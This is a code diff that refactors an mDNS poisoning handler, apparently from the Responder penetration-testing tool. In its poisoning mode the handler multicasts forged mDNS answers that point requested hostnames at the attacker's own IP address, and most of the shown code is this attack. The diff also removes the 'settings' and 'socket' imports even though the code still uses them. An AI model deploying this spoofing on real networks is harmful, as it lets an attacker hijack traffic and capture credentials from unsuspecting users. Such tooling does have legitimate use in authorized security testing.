@@ -15,8 +15,6 @@
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 import struct
-import settings
-import socket
 
 from SocketServer import BaseRequestHandler
 from packets import MDNS_Ans
@@ -33,15 +31,14 @@ def Parse_MDNS_Name(data):
 	except IndexError:
 		return None
 
+
 def Poisoned_MDNS_Name(data):
 	data = data[12:]
-	Name = data[:len(data)-5]
-	return Name
+	return data[:len(data)-5]
+
 
 class MDNS(BaseRequestHandler):
-
 	def handle(self):
-
 		MADDR = "224.0.0.251"
 		MPORT = 5353
 
@@ -52,22 +49,15 @@ class MDNS(BaseRequestHandler):
 		if (not Request_Name) or (RespondToThisHost(self.client_address[0], Request_Name) is not True):
 			return None
 
-		try:
-			# Analyze Mode
-			if settings.Config.AnalyzeMode:
-				if Parse_IPV6_Addr(data):
-					print text('[Analyze mode: MDNS] Request by %-15s for %s, ignoring' % (color(self.client_address[0], 3), color(Request_Name, 3)))
+		if settings.Config.AnalyzeMode:  # Analyze Mode
+			if Parse_IPV6_Addr(data):
+				print text('[Analyze mode: MDNS] Request by %-15s for %s, ignoring' % (color(self.client_address[0], 3), color(Request_Name, 3)))
+		else:  # Poisoning Mode
+			if Parse_IPV6_Addr(data):
 
-			# Poisoning Mode
-			else:
-				if Parse_IPV6_Addr(data):
-					
-					Poisoned_Name = Poisoned_MDNS_Name(data)
-					Buffer = MDNS_Ans(AnswerName = Poisoned_Name, IP=socket.inet_aton(settings.Config.Bind_To))
-					Buffer.calculate()
-					soc.sendto(str(Buffer), (MADDR, MPORT))
-					
-					print color('[*] [MDNS] Poisoned answer sent to %-15s for name %s' % (self.client_address[0], Request_Name), 2, 1)
+				Poisoned_Name = Poisoned_MDNS_Name(data)
+				Buffer = MDNS_Ans(AnswerName = Poisoned_Name, IP=socket.inet_aton(settings.Config.Bind_To))
+				Buffer.calculate()
+				soc.sendto(str(Buffer), (MADDR, MPORT))
 
-		except Exception:
-			raise
+				print color('[*] [MDNS] Poisoned answer sent to %-15s for name %s' % (self.client_address[0], Request_Name), 2, 1)
